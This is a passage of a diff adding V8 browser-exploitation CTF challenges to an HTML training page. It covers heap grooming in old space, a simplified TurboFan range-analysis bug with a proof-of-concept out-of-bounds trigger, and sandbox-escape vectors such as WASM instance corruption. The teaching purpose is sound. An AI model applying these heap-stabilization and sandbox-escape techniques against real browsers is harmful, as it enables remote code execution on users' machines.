+// Step 2: Verify objects are in old space
+%DebugPrint(stable_arrays[0]);
+// Check: should show old_space in the output
+
+// Step 3: Allocate adjacent objects in old space
+gc();  // Major GC to compact
+let target_a = new ArrayBuffer(0x40);
+let target_b = new ArrayBuffer(0x40);
+%DebugPrint(target_a);
+%DebugPrint(target_b);
+
+// TASKS:
+// 1. Verify both ArrayBuffers are in old space
+// 2. Check if they're adjacent after a major GC
+// 3. Trigger multiple GCs and check if addresses change (compaction!)
+// 4. Find a strategy to keep objects at stable addresses
+
+// FLAG: FLAG{old_space_promotion}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Key insight:</strong> Objects in new space are moved every scavenge. To stabilize heap layout for exploitation, promote objects to old space by surviving 2+ scavenges. In old space, objects are only moved during compaction (Mark-Sweep-Compact), which is less frequent.<br>
+            For even more stability, use Large Object Space — objects larger than <code>kMaxRegularHeapObjectSize</code> (~128KB) get their own mmap'd pages and are never moved.<br>
+            <strong>Flag:</strong> FLAG{old_space_promotion}</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 10 -->
+        <div class="ctf-card">
+          <h4>Challenge 10: Patch Diff Analysis</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Analyze the following simplified V8 patch diff. Identify the bug class, the root cause, and what kind of exploit primitive it enables. The flag is the bug class.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Simplified patch (based on a real pattern seen in V8 CVEs)
+--- a/src/compiler/simplified-lowering.cc
++++ b/src/compiler/simplified-lowering.cc
+@@ -1234,7 +1234,8 @@
+   case IrOpcode::kSpeculativeNumberAdd: {
+     Type left_type = GetUpperBound(node->InputAt(0));
+     Type right_type = GetUpperBound(node->InputAt(1));
+-    Type result_type = Type::Range(left_type.Min() + right_type.Min(),
+-                                   left_type.Max() + right_type.Max());
++    // Fix: account for overflow in range computation
++    double result_min = left_type.Min() + right_type.Min();
++    double result_max = left_type.Max() + right_type.Max();
++    if (result_min > result_max) std::swap(result_min, result_max);
++    Type result_type = Type::Range(result_min, result_max);
+     SetOutput(node, MachineRepresentation::kWord32);
+     break;
+   }</code></pre>
+<pre><code class="language-javascript">// PoC concept: trigger the incorrect range
+function trigger(x) {
+  // V8 infers x is in range [0, 0x7FFFFFFF]
+  let idx = x + x;
+  // Bug: result range computed as [0, 0xFFFFFFFE] (unsigned)
+  // But actual result can overflow int32 → negative!
+  // TurboFan thinks idx is always positive → removes bounds check
+  let arr = new Array(10);
+  return arr[idx];  // OOB access when idx overflows!
+}
+
+// TASKS:
+// 1. What bug class is this? (range analysis error, type confusion, UAF, etc.)
+// 2. What was wrong with the original code?
+// 3. How does this lead to OOB?
+// 4. What's the fix doing?
+
+// FLAG: FLAG{incorrect_range_analysis}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Analysis:</strong><br>
+            <strong>Bug class:</strong> Incorrect range analysis in TurboFan's SimplifiedLowering phase.<br>
+            <strong>Root cause:</strong> When computing the range of <code>a + b</code>, the original code assumed <code>min + min ≤ max + max</code>. But with integer overflow (e.g., two large positive numbers wrapping to negative), <code>max + max</code> can be less than <code>min + min</code>, producing an inverted range.<br>
+            <strong>Impact:</strong> TurboFan uses the wrong range to eliminate bounds checks → OOB array access.<br>
+            <strong>Fix:</strong> Check for range inversion and swap if needed.<br>
+            <strong>Flag:</strong> FLAG{incorrect_range_analysis}</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 11 -->
+        <div class="ctf-card">
+          <h4>Challenge 11: Sandbox Escape Concepts</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Given arbitrary R/W inside the V8 sandbox, identify which technique can achieve code execution outside the sandbox. The flag is the escape vector.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># V8 Sandbox architecture:
+# - All JS heap objects are inside the 4GB pointer compression cage
+# - ArrayBuffer backing stores are inside the ~1TB sandbox
+# - External pointers go through the External Pointer Table (EPT)
+# - Code pointers go through the Code Pointer Table (CPT)
+# - WASM memory is inside the sandbox
+
+# With arbitrary R/W inside the sandbox, you can:
+# [X] Corrupt JS objects          → but still inside cage
+# [X] Read/write ArrayBuffers     → but backing store is in sandbox
+# [X] Corrupt EPT entries         → entries are tagged, type-checked
+# [?] Corrupt WASM instance data  → potential escape vector
+# [?] Corrupt JIT code            → code is in code cage with CPT
+# [?] Signal handler abuse        → race condition based
+
+# TASKS:
+# 1. Why can't you just overwrite a function pointer?
+# 2. What protections does the External Pointer Table provide?
+# 3. Research: how have recent V8 sandbox escapes worked?
+#    (Hint: WASM instance, signal handlers, JIT corruption)
+# 4. What is the role of the Code Pointer Table?
+
+# FLAG: FLAG{wasm_instance_corruption}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Key escape vectors (as of 2024-2025):</strong><br>
+            1. <strong>WASM instance data corruption:</strong> Overwrite the WASM instance's imported function table or indirect call target to redirect control flow outside the sandbox. WASM instances contain pointers to native code that can be corrupted.<br>
+            2. <strong>Signal handler manipulation:</strong> Race between signal delivery and handler registration — less reliable but doesn't require WASM.<br>
+            3. <strong>JIT code page corruption:</strong> If you can write to code pages (bypassing W^X), you inject shellcode directly — but V8 now uses a Code Pointer Table to prevent this.<br>
+            The V8 security team continuously hardens these vectors. Check <code>chromium.googlesource.com/v8/v8/+/main/src/sandbox/</code> for latest mitigations.<br>
+            <strong>Flag:</strong> FLAG{wasm_instance_corruption}</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</body>
+</html>
